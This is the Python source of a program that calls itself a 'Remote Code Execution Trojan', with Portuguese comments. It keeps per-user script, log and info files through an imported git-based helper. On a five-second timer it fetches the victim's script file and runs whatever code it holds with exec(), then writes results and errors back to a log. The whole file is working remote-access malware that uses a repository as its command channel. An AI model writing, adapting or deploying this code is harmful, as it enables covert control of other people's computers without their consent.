# Importar módulos
from git import *

import os
import sys
import threading
import traceback

import time
from datetime import datetime


# Constantes de depuração
APP_NOME = "Remote Code Execution Trojan [RCET]"
APP_VERSAO = "1.1.0"


# Variáveis
username = os.environ.get("USERNAME")
caminho_script = username + "/script.py"
caminho_log = username + "/log.txt"
caminho_info = username + "/info.json"

script = ""
tempo = 5.0
logs = 0


def main():
	print(APP_NOME + " [v" + APP_VERSAO + "] carregado com sucesso")

	if getattr(sys, 'frozen', False):  # está em .exe
		caminho_completo = sys.executable
	else:  # está em .py
		caminho_completo = os.path.abspath(__file__)

	# Adiciona uma entrada ao log caso ele exista.
	log_mensagem = APP_NOME + " iniciado" + \
		"\nVersão: " + APP_VERSAO + \
		"\nDelay do temporizador: " + str(tempo) + "s" + \
		"\nCaminho: " + caminho_completo
	log_criado = False
	
	if get_sha(caminho_log):
		criar_log(log_mensagem)
		log_criado = True

	# Cria ou atualiza os arquivos deste usuário
	criar_arquivos_de_usuario(False)

	# Caso a entrada não pôde ser adiciona ao log anteriormente, tenta novamente agora
	if not log_criado:
		criar_log(log_mensagem)
		log_criado = True

	# Cria o timer, portanto, o loop do programa
	criar_timer()


def criar_arquivos_de_usuario(reset):
	if reset:
		deletar_arquivo(username)

	criar_arquivo(caminho_script, "", False)
	criar_arquivo(caminho_log, "", False)
	criar_arquivo(caminho_info, "", False)


def criar_log(log):
	global logs

	# Obtém as informações atuais do log
	caminho_log = username + "/log.txt"
	conteudo_inicial = ler_arquivo(caminho_log)

	# Adicionar separador de seções
	if logs <= 0:
		conteudo_inicial = "\n\n\n=====================================================================\n" + conteudo_inicial

	# Obtém data e hora
	unix = datetime.now().timestamp()
	timestamp = "[" + str(datetime.fromtimestamp(unix)) + "] "

	# Adiciona uma nova entrada ao log
	conteudo = timestamp + log

	# Junta com entradas já existentes
	conteudo = "\n\n" + conteudo + conteudo_inicial

	# Atualiza o arquivo
	criar_arquivo(caminho_log, conteudo, True)
	print(timestamp + log)

	logs += 1


def criar_timer():
	timer = threading.Timer(tempo, executar_arquivo_de_usuario)
	timer.start()


def executar_arquivo_de_usuario():
	# Lê o código que deve ser executado na máquina do usuário
	conteudo = ler_arquivo(caminho_script)

	# Cria um log se um novo código deve ser executado
	global script
	if script != conteudo:
		script = conteudo
		criar_log("Script atualizado:\n" + script)

	# Executa o código
	try:
		exec(conteudo, globals())
	except Exception as erro:
		criar_log("Erro ao executar script:\n{" +
			"\tTipo: " + str(type(erro).__name__) + "\n" + 
			"\tMensagem: " + str(erro) + "\n" + 
			"\tTraceback: " + str(traceback.print_exc()) + "\n" + 
		"}")
	
	# Redefine o script
	if "execucao_unica = true" in script:
		criar_arquivo(caminho_script, "")

	# Loop
	criar_timer()


main()